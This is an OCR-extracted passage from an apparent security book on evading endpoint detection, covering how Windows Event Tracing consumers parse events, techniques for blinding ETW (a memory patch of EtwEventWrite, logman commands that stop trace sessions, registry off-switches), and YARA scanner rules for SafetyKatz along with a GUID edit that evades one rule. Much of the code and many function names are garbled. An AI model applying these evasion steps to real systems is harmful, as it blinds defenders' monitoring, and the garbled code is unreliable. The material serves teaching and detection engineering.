    ULONG                BinaryXMLSize;
    union {
        ULONG EventNameOffset;
        ULONG ActivityIDNameOffset;
    };
    union {
        ULONG EventAttributesOffset;
        ULONG RelatedActivityIDNameOffset;
    };
    ULONG            PropertyCount;
    ULONG            TopLevelPropertyCount;
    union {
    TEMPLATE_FLAGS Flags;
    struct {
        ULONG Reserved : 4;
        ULONG Tags : 28;
    };
}  EVENT_PROPERTY_INFO EventPropertyInfoArray[ANYSIZE_ARRAY];
} TRACE_EVENT_INFO;
```

Listing 8-18: The TRACE_EVENT_INFO structure definition

160 Chapter 8

---

When the function returns, it will populate this structure with useful metadata, such as the DcodingSource ❶ used to identify how the event is defined (in an instrumentation manifest, MOF class, or WPP template). But the most important value is EventPropertyInfoArray ❷, an array of EVENT_PROPERTY_INFO structures, defined in Listing 8-19, that provides information about each property of the EVENT_RECORD's UserData member.

```bash
typedef struct _EVENT_PROPERTY_INFO {
  ● PROPERTY_FLAGS Flags;
    ULONG    NameOffset;
    union {
      struct {
        USHORT IntType;
        USHORT OutType;
        ULONG MapNameOffset;
      } nonStructType;
      struct {
        USHORT StructStartIndex;
        USHORT NumOfStructMembers;
        ULONG padding;
      } structType;
      struct {
        USHORT IntType;
        USHORT OutType;
        ULONG CustomSchemaOffset;
      } customSchemaType;
    };
  union {
     ● USHORT count;
        USHORT countPropertyIndex;
    },
    union {
     ● USHORT length;
        USHORT lengthPropertyIndex;
    },
    union {
        ULONG Reserved;
        struct {
            ULONG Tags : 28;
        };
    }; EVENT_PROPERTY_INFO;
```

Listing 8-19: The EVENT_PROPERTY_INFO struct

We must parse each structure in the array individually. First, it gets the length of the property with which it is working. This length is dependent on the way in which the event is defined (for example, MOF versus manifest). Generally, we derive the size of the properties either from the length member, from the size of a known data type (such as the size of an unsigned long, or ulong), or by calling tthT?d?PropertySize(). If the property itself is an array, we need to retrieve its size by either evaluating the count member, or calling tthT?d?PropertySize() again.

Event Tracing for Windows 161

---

Next, we need to determine whether the data being evaluated is itself a structure. Since the caller typically knows the format of the data with which they're working, this isn't difficult in most cases and generally only becomes relevant when parsing events from unfamiliar providers. If an agent does need to work with structures inside events, however, the flags member ❶ will include the PropertyStruct (0x8) flag.

When the data isn't a structure, as in the case of the MicrosoftWindows-DotNetR3 runtime provider, it will be a simple value mapping, and we can get this map information using tdhTdtGetEventMapInformation(). This function takes a pointer to the TRACE_EVENT_INFO, as well as a pointer to the map name offset, which it can access via the MapNameOffset member. On completion, it receives a pointer to an EVENT_MAP_INFO structure, defined in Listing 8-20, which defines the metadata about the event map.

```bash
typedef struct _EVENT_MAP_INFO {
    ULONG        NameOffset;
    MAP_FLAGS      Flag;
    ULONG        EntryCount;
  union {
      MAP_VALUETYPE MapEntryValueType;
    ULONG        FormatStringOffset;
  };
  EVENT_MAP_ENTRY MapEntryArray[ANYSIZE_ARRAY];
} EVENT_MAP_INFO;
```

Listing 8-20: The EVENT_MAP_INFO structure definition

Listing 8-21 shows how our callback function uses this structure.

```bash
void CALLBACK OnEvent(PEVENT_RECORD pRecord)
{
    --snip--
   WCHAR pszValue[512];
   USHORT wPropertyLen = 0;
   ULONG ulPointerSize =
     (pRecord->EventHeader.Flags & EVENT_HEADER_FLAG_32_BIT_HEADER) ? 4 : 8;
   USHORT wlUserDataLen = pRecord->UserDataLength;
  } for (USHORT i = 0; i < pEventData->ToplevelPropertyCount; i++)
  {      EVENT_PROPERTY_INFO propertyInfo =
          pEventData->EventDataPropertyInfoArray[i];
          PCTSTR pszPropertyName =
              PCTSTR((BYTE*)pEventData + propertyInfo.NameOffset);
      wPropertyLen = propertyInfo.length;
  } if ((propertyInfo.flags & PropertyStruct | PropertyParamCount)) != 0)
  {      return;
    }    PEVENT_MAP_INFO pMapInfo = NULL;
  }
```

---

```bash
PHSTR mapName = NULL;
   ¤ if (propertyInfo.nonStructType.MapNameOffset)
      {
        ULONG ulMapSize = 0;
        mapName = (PHSTR)((BYTE*)pEventInfo +
            propertyInfo.nonStructType.MapNameOffset);
        dwStatus = TdhGetEventMapInformation(
                pRecord,
                mapName,
                pMapInfo,
                &ulMapSize);
        if (dwStatus == ERROR_INSUFFICIENT_BUFFER)
        {
            pMapInfo = (PEVENT_MAP_INFO)malloc(ulMapSize);
   ¤ dwStatus = TdhGetEventMapInformation(
                pRecord,
                mapName,
                pMapInfo,
                &ulMapSize);
        if (dwStatus != ERROR_SUCCESS)
        {
            pMapInfo = NULL;
        }
        }
  } --snip--
}
```

Listing 8-21: Parsing the event map information

To parse the events that the provider emits, we iterate over every toplevel property in the event by using the total count of properties found in

TopLevelPropertyCount for the trace event information structure ❶ . Then, if we're not dealing with a structure ❷ and the offset to the name of the member is present ❸ , we pass the offset to tdh!TdhGetEventMapInformation() ❹ to get the event map information.

At this point, we've collected all the pieces of information required to fully parse the event data. Next, we call tdhTdnFormatProperty(), passing in the information we collected previously. Listing 8-22 shows this function in action.

```bash
void CALLBACK OnEvent(PEVENT_RECORD pRecord)
{
    --snip--
  ULONG uLBufferSize = sizeof(pszValue);
  USHORT wSizeConsumed = 0;
  dwStatus = TdhFormatProperty(
            pEventInfo,
            pMapInfo,
                    Event Tracing for Windows  163
```

---

```bash
ulPointerSize,
        propertyInfo.nonStructType.InType,
        propertyInfo.nonStructType.OutOfRange,
        wPropertyLen,
        wUserDataLen,
        pUserData,
        &ulBufferSize,
        ● pszValue,
        &wSizeConsumed;
   if (dwStatus == ERROR_SUCCESS)
   {       --snip--
     wprintf(L"%s: %s\n", ● pszPropertyName, pszValue);
     --snip--
   }
   --snip--
```

Listing 8-22: Retrieving event data with tdh!TdhFormatProperty()

After the function completes, the name of the property (as in the keyportion of the key-value pair) will be stored in the NamedOffset member of the event map information structure (which we've stored in the pszPropertyName variable ❸ for brevity). Its value will be stored in the buffer passed into tdh!TdhFormatProperty() as the buffer parameter (pszValue, in our example).

## Testing the Consumer

The snippet shown in Listing 8-23 comes from our .NET event consumer.

It shows the assembly-load event for the Seatbelt reconnaissance tool being

loaded into memory via a command-and-control agent.

```bash
AssemblyID: 0x26681031DC0
AppDomainID: 0x266968BA650
BindingID: 0x0
AssemblyFlags: 0
FullyQualifiedAssemblyName: Seatbelt, Version=1.0.0.0, --snip--
ClrInstanceID: 10
```

Listing 8-23: Consumer of the Microsoft-Windows-DotNETruntime provider detecting

Seatbelf being loaded

From here, the agent can use the values as it pleases. If, for instance, the agent wanted to terminate any process that loads the Seatbelt assembly, it could use this event to trigger that preventive action. To instead act more passively, it could take the information collected from this event, supplement it with additional information about the originating process, and create its own event to feed into detection logic.

---

## Evading ETW-Based Detections

As we've demonstrated, ETW can be an incredibly useful method for collecting information from system components that would otherwise be impossible to get. The technology isn't without its limitations, however. Because ETW was built for monitoring or debugging and not as a critical security component, its protections aren't as robust as those of other sensor components.

In 2021, Claudiu Teodosurescu, Igor Korkin, and Andrey Golchikov of Binary gave a great presentation at Black Hat Europe in which they catalozed existing ETW evasion techniques and introduced new ones. Their task identified 36 unique tactics for bypassing ETW providers and trace sessions. The presenters split these techniques into five groups: attacks from inside an attacker-controlled process; attacks on ETW environment variables, the registry, and files; attacks on user-mode ETW providers; attacks on kernel-mode ETW providers; and attacks on ETW sessions.

Many of these techniques overlap in other ways. Moreover, while some work across most providers, others target specific providers or trace sessions. Several of the techniques are also covered in Palantir's blog post "Tampering with Windows Event Tracing: Background, Offense, and Defense." To summarize both groups' findings, this section breaks down the evasions into broader categories and discusses the pros and cons of each.

### Patching

Arguably the most common technique for evading ETW in the offensive world is patching critical functions, structures, and other locations in memory that play some role in the emission of events. These patches aim to either completely prevent the provider from emitting events or selectively filter the events that it sends.

You'll most commonly see this patching take the form of function hooking, but attackers can tamper with numerous other components to alter event flow. For example, an attacker could null out the TRACEHANDLE used by the provider or modify its TraceLevel to prevent certain types of events from being emitted. In the kernel, an attacker could also modify structures such as the EVT_REG_ENTRY, the kernel's representation of an event registration object. We'll discuss this technique in greater detail in "Bypassing a .NET Consumer" on page 166.

### Configuration Modification

Another common technique involves modifying persistent attributes of the system, including registry keys, files, and environment variables. A vast number of procedures fall into this category, but all generally aim to prevent a trace session or provider from functioning as expected, typically by abusing something like a registry-based "off" switch.

Two examples of "off" switches are the COMPLUS ÚTEnabled environment variable and the ETL enabled value under the HKCL\Software\Microsoft\ .NET\Framework registry key. By setting either of these values to 0, an adversary

Event Tracing for Windows | 165

---

can instruct dtk.dll the image for the Microsoft-Windows-DotNETruntime provider, not to register any TRACEHANDLE, preventing the provider from emitting ETW events.

### Trace-Session Tampering

The next technique involves interfering with trace sessions already running on the system. While this typically requires system-level privileges, an attacker who has elevated their access can interact with a trace session of which they are not the explicit owner. For example, an adversary may remove a provider from a trace session using sechost!EnableTraceEx2() or, more simply, using logman with the following syntax:

```bash
_________________________________________________________________
logman.exe update trace TRACE_NAME --p PROVIDER_NAME --ets
_________________________________________________________________
```

Even more directly, the attacker may opt to stop the trace entirely:

```bash
______________________________________________________________________________________________________________________
logman.exe stop TRACE_NAME -ets
```

### Trace-Session Interference

The final technique complements the previous one: it focuses on preventing trace sessions, most commonly autologgers, from functioning as expected before they are started, resulting in persistent changes to the system.

One example of this technique is the manual removal of a provider from an autologer session through a modification of the registry. By deleting the subkey tied to the provider, HKLM:\SYSTEM\@CurrentControlSet\ Control\WM\Autologer\<AUTOLOGER_NAME>\cPROVIDER_GUIDS, or by setting its enabled value to 0, the attacker can remove the provider from the trace session after the next reboot.

Attackers could also take advantage of ETW's mechanisms to prevent sessions from working as expected. For example, only one trace session per host can enable a legacy provider (as in MOF- or TMF-based WPP). If a new session enabled this provider, the original session would no longer receive the desired events. Similarly, an adversary could create a trace session with the same name as the target before the security product has a chance to start its session. When the agent attempts to start its session, it will be met with an ERROR_ALREADY_EXISTS error code.

## Bypassing a .NET Consumer

Let's practice evading ETW-based telemetry sources by targeting a .NET runtime consumer similar to the one we wrote earlier in this chapter. In his blog post "Hiding Your .NET--ETW," Adam Chester describes how to prevent the common language runtime from emitting ETW events, keeping a sensor from identifying the loading of SharpHound, a C# tool that collects the data to be fed into the path-mapping attacker tool BloodHound.

---

The bypass works by patching the function responsible for emitting the ETW event, stdllEventObject(), and instructing it to return immediately upon entry. Chester discovered that this function was ultimately responsible for emitting the event by setting a breakpoint on this function in WinDbg and watching for calls from ch.dll. The syntax for setting this conditional breakpoint is as follows:

```bash
bp ntdllt#evtWndWrite "r $to = 0;
..foreach (p { k } .if ($pat(\"p\", \"cls!s\") { r $to = 1; .break } );
..if($t0 = 0) { gc }"
```

The conditional logic in this command tells WinDbg to parse the call stack (k) and inspect each line of the output. If any lines begin with c!r1, indicating that the call to ntdll!cbwait!tt!te() originated from the common language runtime, a break is triggered. If there are no instances of this substring in the call stack, the application simply continues.

If we view the call stack when the substring is detected, shown in Listing 8-21, we can observe the common language runtime emitting events.

```bash
0:00D k
# RetAddr
00 ntdll1EtwEventWrite
01 cl!GoTemplate_xxxzgh+0xd5
02 cl!Etw::LoaderLog::SendAssemblyEvent+0x1cd
03 cl!Etw::LoaderLog::ModuleLoad+0x155
04 cl!rDomainAssembly::DeliverSyncEvents+0x29
05 cl!rDomainFile::DoIncrementalLoad+0xd9
06 cl!rAppDomain::TryIncrementalLoad+0x135
07 cl!rAppDomain::LoadDomainFile+0x149
08 cl!rAppDomain::LoadDomainAssemblyInternal+0x23e
09 cl!rAppDomain::LoadDomainAssembly+0xd9
0a cl!rAssemblyNative::GetPostPolicyAssembly+0x4dd
0b cl!rAssemblyNative::LoadFromBuffer+0x702
0c cl!rAssemblyNative::LoadImage+0xef
0d mscorlib_ni!System.AppDomain.Load(Byte[{}])###60007DB+0x3b
0e mscorlib_ni!DomainNeutralILILStubClass_IL_STUB_CLRtoCOM(Byte[{}])
0f cl!rCOMToLCRDispatchHelper+0x39
10 cl!rCOMToLCRWorker+0x1b4
11 cl!rGenericCoCallStub+0x57
12 0x00000209 24af19a6
13 0x00000209 24a30020
14 0x00000209 24a7f390
15 0x000000c2 29fcf950
```

Listing 8-24: An abbreviated call stack showing the emission of ETW events in the common language runtime

Reading from bottom to top, we can see that the event originates in System.AppDomain.Load(), the function responsible for loading an assembly into the current application domain. A chain of internal calls loads into the EWT+LoadLog class, which ultimately calls stdllibTleEventWt() .

Event Tracing for Windows 167

---

While Microsoft doesn't intend for developers to call this function directly, the practice is documented. The function is expected to return a Win32 error code. Therefore, if we can manually set the value in the EAX register (which serves as the return value on Windows) to 0 for ERROR_SUCCESS, the function should immediately return, appearing to always complete successfully without emitting an event.

Patching this function is a relatively straightforward four-step process. Let's dive into it in Listing 8-25.

```bash
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>  -
void PatchedAssemblyLoader()
{
   PVOID pfnEtwEventWrite = NULL;
   DWORD dwOldProtection = 0;
  @ pfnEtwEventWrite = GetLastErrorAddress(
        LoadLibrary(L"ntdll"),
        "EtwEventWrite"
        );
   if (!pfnEtwEventWrite)
    {
      return;
    }
  @ VirtualProtect(
        pfnEtwEventWrite,
        3,
        PAGE_READWRITE,
        &dwOldProtection
        );
  @ memcpy(
        pfnEtwEventWrite,
        "\x33\xc0\xc3", // xor eax, eax; ret
        3
        );
  @ VirtualProtect(
        pfnEtwEventWrite,
        3,
        dwOldProtection,
        NULL
        );
    --snip--
```

Listing 8-25: Patching the ntdll!EtwEventWrite() function

168 Chapter 8

---

We locate the entry point to ndll\ETwEvT write() in the currently loaded copy of ndll.dll using kernle32\T oGetProcess() ❶ . After locating the function, we change the memory protections of the first three bytes (the size of our patch) from read-write (x8) to read-write (x8) ❷ to allow us to overwrite the entry point. Now all we have to do is copy in the patch using something like memcpy() ❸ and then revert the memory protections to their original state ❹ . At this point, we can execute our assembly loader functionality without worrying about generating common language runtime loader events.

We can use WinDbg to validate that ntdll1@eventWrite() will no longer

emit events, as shown in Listing 8-26.

```bash
0:0001 u ntdll16tWtWentWrite
ntdll16tWtEventWrite:
00007fff87e8bf1a0 33c0      xor     eax,eax
00007fff87e8bf1a2 c3       ret
00007fff87e8bf1a1 4883ec58    sub     rsp,58h
00007fff87fe8bf1a4 d8d94be8   mov     dword ptr [r11-18h],r9
00007fff87e8bf1ab 33c0      xor     eax,eax
00007fff87fe8bf1ad 458943e0   mov     dword ptr [r11-20h],r8d
00007fff87e8bf1b4 4533c9      xor     rd9,yd9
00007fff87fe8b1ba 498943d8   mov     dword ptr [r11-28h],rax
```

Listing 8-26: The patched ntdll!EtwEventWrite() function

When this function is called, it will immediately clear the EAX register by setting it to 0 and return. This prevents the logic for producing ETW events from ever being reached and effectively stops the provider's telemetry from flowing to the EDR agent.

Even so, this bypass has limitations. Because cbr.dll and ndll.dll are mapped into their own processes, they have the ability to tamper with the provider in a very direct manner. In most cases, however, the provider is running as a separate process outside the attacker's immediate control. Patching the event-emission function in the mapped ndll.dll won't prevent the emission of events in another process.

In his blog post "Universally Evading Symon and ETW," Dylan Halls describes a different technique for preventing ETW events from being emitted that involves patching ntilllllTraceEvent(), the syscall that ultimately leads to the ETW event, in kernel mode. This means that any ETW event on the system routed through this syscall won't be emitted while the patch is in place. This technique relies on the use of Kernel Driver Utility (KDU) to subvert Driver Signature Enforcement and InfinityHook to mitigate the risk of PatchGuard crashinging the system if the patch were detected. While this technique expands the ability to evade ETW-based detections, it requires a driver to be loaded and protected kernel-mode code to be modified, making it subject to any mitigations to the techniques leveraged by KDU or InfinityHook.

---

## Conclusion

ETW is one of the most important technologies for collecting host-based telemetry on Windows. It provides an EDR with visibility into components and processes, such as the Task Scheduler and local DNS client, that no other sensor can monitor. An agent can consume events from nearly any providers it finds and use that information to gain an immense amount of context about system activities. Evasion of ETW is well researched, with most strategies focusing on disabling, unregistering, or otherwise rendering a provider or consumer unable to handle events.

170 Chapter B

---

## 9 scanners

![Figure](figures/EvadingEDR_page_197_figure_001.png)

Nearly every EDR solution includes a component that accepts data and tries to determine whether the content is malicious.

Endpoint agents use it to assess many different

data types, such as files and memory streams, based on a set of rules that the vendor defines and updates. This component, which we'll refer to as the scanner for simplicity’s sake, is one of the oldest and best-studied areas in security from both the defensive and offensive angles.

Because covering all aspects of their implementation, processing logic, and signatures would be like trying to boil the ocean, this chapter focuses on the rules employed by file-based scanners. Scanner rules differentiate one product's scanner from another (barring major performance differences or other technical capabilities). And on the offensive side, it's the scanner rules rather than the implementation of the scanner itself that adversaries must evade.

---

## A Brief History of Antivirus Scanning

We don't know who invented the antivirus scanning engine. German security researcher Bernd Fix developed some of the first antivirus software, in 1987, to neutralize the Vienna virus, but it wasn't until 1991 that the world saw an antivirus scanning engine that resembles the ones in use today: FRISK Software's F-PROT antivirus would scan a binary to detect any reordering of its sections, a pattern that malware developers of the time commonly employed to jump execution to the end of the file, where they had placed malicious code.

As viruses became more prevalent, dedicated antivirus agents became a requirement for many companies. To meet this demand, vendors such as Symantec, McAfee, Kaspersky, and F-Secure brought their scanners to market in the 1990s. Regulatory bodies began enforcing the use of antivirus to protect systems, further promoting their adoption. By the 2010s, it was nearly impossible to find an enterprise environment without antivirus software deployed on most of its endpoints.

This broad adoption lilled many directors of information-security programs into a false sense of security. While these antimalware scanners had some success in detecting commodity threats, they missed more advanced threat groups, which were achieving their objectives without detection.

In May 2013, Will Schroeder, Chris Truncer, and Mike Wright released their tool, Veil, which opened many people's eyes to this overreliance on antivirus scanners. Veil's entire purpose was to create payloads that bypassed antivirus by employing techniques that broke legacy detection rulesets. These techniques included string- and variable-name obfuscation, less common code-injection methods, and payload encryption. During offensive security engagements, they proved that their tool could effectively evade detection, causing many companies to reevaluate the value of the antivirus scanners they paid for. Simultaneously, antivirus vendors began rethinking how to approach the problem of detection.

While it's hard to quantify the impact of Veil and other tools aimed at tackling the same problem, these tools undoubtedly moved the needle, leading to the creation of more robust endpoint detection solutions. These newer solutions still make use of scanners, which contribute to the overall detection strategies, but they have grown to include other sensors that can provide coverage when the scanners' rulesets fail to detect malware.

## Scanning Models

Scanners are software applications that the system should invoke when appropriate. Developers must choose between two models to determine when their scanner will run. This decision is more complex and important than it may seem at face value.

172 Chapter 9

---

## On Demand

The first model, on-demand scanning , instructs a scanner to run at some set time or when explicitly requested to do so. This type of scanning typically interacts with a large number of targets (for example, files and folders) on each execution. The Quick Scan feature in Microsoft Defender, shown in Figure 9 - 1 , may be the most familiar example of this model.

![Figure](figures/EvadingEDR_page_199_figure_002.png)

Figure 9-1: Defender's Quick Scan feature in action

When implementing this model, developers must consider the potential performance impacts on the system caused by the scanner processing thousands of files at once. On resource-constrained systems, it might be best to run this type of scan during off-hours (for example, 2 am every Tuesday) than to run a full scan during working hours.

The other major downside of this model involves the period of time between each scan. Hypothetically, an attacker could drop malware on the system after the first scan, execute it, and remove it before the next scan, to evade detection.

## On Access

During on-access scanning, often referred to as real-time protection, the scanner assesses an individual target while some code is interacting with it or when a suspicious activity occurs and warrants investigation. You'll most often find this model paired with another component that can receive notifications when something interacts with the target object, such as a filesystem minifilter driver. For example, the scanner might investigate a file when it is downloaded, opened, or deleted. Microsoft Defender implements this model on all Windows systems, as shown in Figure 9-2.

![Figure](figures/EvadingEDR_page_199_figure_008.png)

Figure 9-2: Defender's real-time protection features enabled by default

Scanners 173

---

The on-access scanning approach generally causes more of a headache for adversaries because it removes the ability to abuse the periods of time between on-demand scans. Instead, attackers are left trying to evade the ruleset used by the scanner. Let's now consider how these rulesets work.

## Rulesets

At the heart of every scanner is a set of rules that the engine uses to assess the content to be scanned. These rules more closely resemble dictionary entries than firewall rules; each rule contains a definition in the form of a list of attributes that, if identified, signals that the content should be treated as malicious. If the scanner detects a match for a rule, it will take some predetermined action, such as quarantining the file, killing the process, or alerting the user.

When designing scanner rules, developers hope to capture a unique attribute of a piece of malware. These features can be specific, like the names or cryptographic hashes of files, or they can be broader, such as DLLs or functions that the malware imports or a series of opcodes that serve some critical function.

Developers might base these rules on known malware samples detected outside the scanner. Sometimes other groups even share information about the sample with a vendor. The rules can also target malware families or techniques more generally, such as a known group of APIs used by ransomware, or strings like bcdedit.exe, which might indicate that malware is trying to modify the system.

Vendors can implement both types of rules in whatever ratio makes sense for their product. Generally, vendors that heavily rely on rules specific to known malware samples will generate fewer false positives, while those that make use of less-specific indicators will encounter fewer false negatives. Because rulesets are made up of hundreds or thousands of rules, vendors can balance the ratio of specific to less-specific detections to meet the false-positive and false-negative tolerances of their customers.

Vendors each develop and implement their own rulesets, but products tend to have a lot of overlap. This is beneficial to consumers, as the overlap ensures that no single scanner dominates the marketplace based on its ability to detect the "threat du jour." To illustrate this, take a look at the results of a query in VirusTotal (an online service used to investigate suspicious files, IPs, domain names, and URLs). Figure 9-3 shows a phishing lure associated with FIN7, a financially motivated threat group, detected by 33 security vendors, demonstrating the overlap of these rulesets.

There have been many attempts to standardize scanner rule formats to facilitate the sharing of rules between vendors and the security community. At the time of this writing, the YARA rule format is the most widely adopted, and you'll see it used in open source, community-driven detection efforts as well as by EDR vendors.

174 Chapter 9

---

![Figure](figures/EvadingEDR_page_201_figure_000.png)

Figure 9-3: VirusTotal scan results for a file associated with FIN7.

## Case Study: YARA

Originally developed by Victor Alvarez of VirusTotal, the YARA format helps researchers identify malware samples by using textual and binary patterns to detect malicious files. The project provides both a stand-alone executable scanner and a C programming language API that developers can integrate into external projects. This section explores YARA, as it provides a great example of what a scanner and its rulesets look like, has fantastic documentation, and is widely used.

### Understanding YARA Rules

YARA rules use a simple format: they begin with metadata about the rule, followed by a set of strings describing the conditions to be checked and a Boolean expression that describes the rule logic. Consider the example in Listing 9-1.

```bash
rule SafetyKatz_PE
{
  ⓒ meta:
      description = "Detects the default .NET TypeLibGuid for SafetyKatz"
      reference = "https://github.com/GhostPack/SafetyKatz"
      author = "Matt Hand"
  ⓒ strings:
      $guid = "8347e81b-89fc-42a9-b22c-f59a6a572dec" ascii nocase wide
      condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $guid
    }
Listing 9-1: A YARA rule for detecting the public version of SafetyKatz
                                                                                          Scanners     175
```

---

This simple rule, called SafeKeys_PE, follows a format commonly used to detect off-the-shelf .NET tooling. It begins with some metadata containing a brief description of the rule, a reference to the tool it aims to detect, and, optionally, the date on which it was created . This metadata has no bearing on the scanner's behavior, but it does provide some useful context about the rule's origins and behavior.

Next is the strings section. While optional, it houses useful strings found inside the malware that the rule's logic can reference. Each string has an identifier, beginning with a $, and a function, like in a variable declaration. YARA supports three different types of strings: plaintext, hexadecimal, and regular expressions.

Plaintext strings are the most straightforward, as they have the least variation, and YARA's support of modifiers makes them especially powerful. These modifiers appear after the contents of the string. In Listing 9-1, the string is paired with the modifiers ascii_nocase_wide , which means that the string should be checked without sensitivity to case in both ASCII and wide formats (the wide format uses two bytes per character). Additional modifiers, including xor, base64, base64ide, and fullord, exist to provide even more flexibility when defining a string to be processed. Our example rule uses only one plaintext string, the GUID for TypeLib, an artifact created by default in Visual Studio when a new project is begun.

Hexadecimal strings are useful when you're searching for non-printable characters, such as a series of opcodes. They're defined as space-delimited bytes enclosed in curly brackets (for example, $foo = { BE EF } ). Like plaintext strings, hexadecimal strings support modifiers that extend their functionality. These include wildcards, jumps, and alternatives. Wildcards are really just placeholders that say "match anything here" and are denoted with a question mark. For example, the string { BE ?? } would match anything from { BE 00 } to { BE FF } appearing in a file. Wildcards are also nibble-wise , meaning that the rule author can use a wildcard for either nibble of the byte, leaving the other one defined, which allows the author to scope their search even further. For example, the string { BE EF } would match anything from { BE EO } to { BE EF .

In some situations, the content of a string can vary, and the rule author might not know the length of these variable chunks. In that case, they can use a jump. jumps are formatted as two numbers delimited with a hyphen and enclosed in square brackets. They effectively mean "the values starting here and ranging from X to Y bytes in length are variable." For example, the hexadecimal string $foo = { 0E [1-3] 0F } would match any of the following:

```bash
BE EE EF
    BE OO B1 EF
    BE EF OO B2 EF
```

Another modifier supported by hexadecimal strings is alternatives . Rule authors use these when working with a portion of a hex string that has multiple possible values. The authors delimit these values with pipes and store

---

them in parentheses. There is no limit to the number or size of alternatives in a string. Additionally, alternatives can include wildcards to expand their utility. The string $foo = { BE ( EE | EF BE | ?? OO ) EF } would match any of the following:

```bash
BB EE EF
BE EE BF
BE EE OO
BE A1 OO BF
```

The final and only mandatory section of a YARA rule is called the condition. Conditions are Boolean expressions that support Boolean operators (for example, AND), relational operators (for example, !=), and the arithmetic and bitwise operators (for example, + and %) for numerical expressions.

Conditions can work with strings defined in the rule while scanning the file. For example, the SafetyKatz rule makes sure that the TypeLib GUID is present in the file. But conditions can also work without the use of strings. The first two conditions in the SafetyKatz rule check for the two-byte value 0x405A (the MZ header of a Windows executable) at the start of the file and the four-byte value 0x00004550 (the PE signature) at offset 0x3C. Conditions can also operate using special reserved variables. For example, here is a condition that uses the filesystem special variable: filesystem <30KB. It will return true if the total file size is less than 30KB.

Conditions can support more complex logic with additional operators. One example is the of operator. Consider the example shown in Listing 9-2.

```bash
rule Example
{
  strings:
        $x = "Hello"
        $y = "world"
    condition:
        any of them
}
```

Listing 9-2: Using YARA's of operator

This rule returns true if either the "hello" string or the "world" string is found in the file being scanned. Other operators exist, such as all of , for when all strings must be present; N of , for when some subset of the strings must be present; and the for...of iterator, to express that only some occurrences of the string should satisfy the rule's conditions.

## Reverse Engineering Rules

In production environments, you'll commonly find hundreds or even thousands of rules analyzing files correlating to malware signatures. There are over 200,000 signatures in Defender alone, as shown in Listing 9-3.

Scanners 177

---

```bash
PS > $$signatures = {Get-MpThreatCatalog}.ThreatName
PS > $$signatures | Measure-Object -Line | select Lines
Lines
-----
222975
PS > $$signatures | Group {$_.Split(':')[0]} |
>> Sort Count -Descending |
>> select Count,Name -First 10
Count Name
----- -----
57265 Trojan
28101 TrojanDownloader
27546 Virus
19720 Backdoor
17323 Worm
11768 Behavior
9903 VirTool
9448 PWS
8611 Exploit
8252 TrojanSpy
```

Listing 9-3: Enumerating signatures in Defender

The first command extracts the threat names, a way of identifying specific or closely related pieces of malware (for example, VirTool:MSIL/ BytChk.CMTB), from Defender's signature catalog. The second command then parses each threat name for its top-level category (for example, VirTool) and returns a count of all signatures belonging to the top levels.

To the user, however, most of these rules are opaque. Often, the only way to figure out what causes one sample to be flagged as malicious and another to be deemed benign is manual testing. The DefenderCheck tool helps automate this process. Figure 9-4 shows a contrived example of how this tool works under the hood.

178 Chaptor 9

---

![Figure](figures/EvadingEDR_page_205_figure_000.png)

Figure 9-4: DefenderCheck's binary search

DefenderCheck splits a file in half, then scans each half to determine which one holds the content that the scanner deemed malicious. It recursively repeats this process on every malicious half until it has identified the specific byte at the center of the rule, forming a simple binary search tree.

## Evading Scanner Signatures

When trying to evade detection by a file-based scanner such as YARA, attackers typically attempt to generate false negatives. In short, if they can figure out what rules the scanner is employing to detect some relevant file (or at least make a satisfactory guess at this), they can potentially modify that attribute to evade the rule. The more brittle the rule, the easier it is to evade. In Listing 9-4 , we use dnSpy, a tool for decompiling and modifying .NET assemblies, to change the GUID in the compiled SafetyKatz assembly so that it evades the brittle YARA rule shown earlier in this chapter.

```bash
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
```

Scanners 179

---

```bash
[assembly: Debuggable(DebkgableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("SafetyKatz")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("SafetyKatz")]
[assembly: AssemblyCopyright("Copyright © 2018")]
[assembly: AssemblyTrademark("")]
[assembly: CwmVisible(false)]
[assembly: Guid("01234567-d3ad-b33f-0000-0123456789ac")] ●
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]
[assembly: UnverifiableCode]
```

Listing 9-4: Modifying the GUID in the assembly using dnSpy

If a detection is built solely around the presence of SafetyKat's default assembly GUID, the change made to the GUID here would evade the rule entirely.

This simple evasion highlights the importance of building detections based on a sample's immutable attributes (or at least those that are more difficult to modify) to compensate for the more brittle rules. This is not to discount the value of these brittle rules, which could detect off-the-shelf Mimikatz, a tool very rarely used for legitimate purposes. However, adding a more robust companion (one whose false-positive rate is higher and false-negative rate is lower) fortifies the scanner's ability to detect samples that have been modified to evade the existing rules. Listing 9-5 shows an example of this using SafetyKatz.

```bash
rule SafetyKatz_InternalFuncs_B64MimiKatz
{
    meta:
        description = "Detects the public version of the SafetyKatz
                          tool based on core P/Invokes and its embedded
                          base64-encoded copy of MimiKatz"
        reference = "https://github.com/GhostPack/SafetyKatz"
        author = "Matt Hand"
    strings:
        $mdwd = "MiniDumpWriteDump" ascii nocase wide
        $ll = "LoadLibrary" ascii nocase wide
        $gpa = "GetProcAddress" ascii nocase wide
        $b64_mimi = "z1i7fBNVrjg8avJlOwUCNF1iapC0XUE" ascii wide
        condition:
          ($mdwd and $ll and $gpa) or $b64_mimi
    }
```

Listing 9-5: YARA rule to detect SafetyKatz based on internal function names and Base64 substrings

You could pass this rule to YARA via the command line to scan the base version of SafetyKatz, as is shown in Listing 9-6.

---

```bash
PS > \yaara64.exe -w -s \safetykatz.rules C:\Temp\SafetyKatz.exe
> \safetyKatzSystemFuncs_B64MimikaKatz C:\Temp\SafetyKatz.exe
0x213b:8mdwd: 0x MiniDumpWriteDump
0x256a:8111: loadLibrary
0x2459:8gpa: GetProAddress
0x25dc:8b0mi: 0
x7x001x001x007x00F\0x08\0x001x0007x0047x00j\x00g\x008\x00aa1x00V\x00J\x00I\x00O
